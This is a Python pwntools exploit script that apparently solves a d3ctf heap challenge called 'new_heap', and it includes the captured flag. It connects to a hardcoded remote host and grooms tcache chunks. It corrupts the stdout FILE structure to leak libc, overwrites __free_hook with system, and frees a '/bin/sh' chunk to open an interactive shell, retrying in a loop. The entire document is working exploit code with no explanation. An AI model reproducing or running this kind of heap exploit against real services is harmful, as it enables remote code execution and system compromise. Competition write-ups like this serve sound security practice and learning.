from pwn import *

ru = lambda x: p.recvuntil(x, drop = True)
sa = lambda x,y: p.sendafter(x,y)
sla = lambda x,y: p.sendlineafter(x,y)

def alloc(size,cnt):
    sa("3.exit\n",str(1).ljust(0x7,'\x00'))
    sa("size:",str(size).ljust(0x7,'\x00'))
    sa("content:",cnt)

def free(idx):
    sa("3.exit\n",str(2).ljust(0x7,'\x00'))
    sa("index:",str(idx).ljust(0x7,'\x00'))
    ru("done\n")

def qu(byte):
    sa("3.exit\n",str(3).ljust(0x7,'\x00'))
    sa("sure?\n",byte)

def exp():
    try:
        global p
        # p = process("./new_heap",env={"LD_PRELOAD":"./libc.so.6"})
        HOST,PORT = '49.235.24.33','20201'
        p = remote(HOST,PORT)
        libc = ELF("./libc.so.6")
        ru("friends:0x")
        byte = int(ru('\n'),16)-0x2
        log.info('byte:'+hex(byte))

        alloc(0x78,'0'*0x78)
        alloc(0x78,'1'*0x78)
        alloc(0x78,'2'*0x78)
        alloc(0x78,'3'*0x78) #3
        alloc(0x78,'\x00'*0x58+p64(0x81)) #5
        alloc(0x38,'5'*0x38) #5
        alloc(0x78,'\x00'*0x18+p64(0x61)) #7
        alloc(0x78,'7'*0x70) #8
        alloc(0x78,'8'*0x70) #8

        free(0)
        free(1)
        free(2)
        free(3)
        free(4)
        free(6)
        free(7)

        free(8)
        alloc(0x78,'\x00'*0x28+p64(0x51)) #10
        free(8)
        alloc(0x78,'\xb0'+chr(byte+0x4)) #11
        ru("done\n")
        qu('\xe1')
        free(5)
        alloc(0x18,'x'*0x18) #12
        ru("done\n")
        alloc(0x8,'\x50\x77') #13
        ru("done\n")
        alloc(0x38,'\n') #14
        ru("done\n")
        alloc(0x38,2*p64(0)+p64(0xfbad1800)+p64(0)*3+p8(0)) #15

        p.recv(8)
        libc.address = u64(p.recv(8))-0x3b5890
        log.info("libc.address:"+hex(libc.address))
        system = libc.sym['system']
        if libc.address<0x700000000000 or libc.address>0x800000000000:
            return
            p.close()
        log.info('system:'+hex(system))
        __free_hook = libc.sym['__free_hook']
        log.info('__free_hook:'+hex(__free_hook))
        ru("done\n")

        sla("size:",str(0x38))
        sa("content:",3*p64(0)+p64(0x81)+p64(libc.sym['__free_hook']))
        ru("done\n")

        p.sendline(str(1)) 
        sla("size:",str(0x78))
        sa("content:","/bin/sh\x00")
        ru("done\n")

        p.sendline(str(1))  
        sla("size:",str(0x78))
        sa("content:",p64(libc.sym['system']))
        ru("done\n")

        p.sendline(str(2))
        sla("index:",str(16))

        p.interactive()
    except EOFError:
        return

if __name__ == "__main__":
    '''
    1/16
    d3ctf{nEW-p@Rad!se-but-noT_pERfeCT}
    '''
    while True:
        exp()
        p.close()

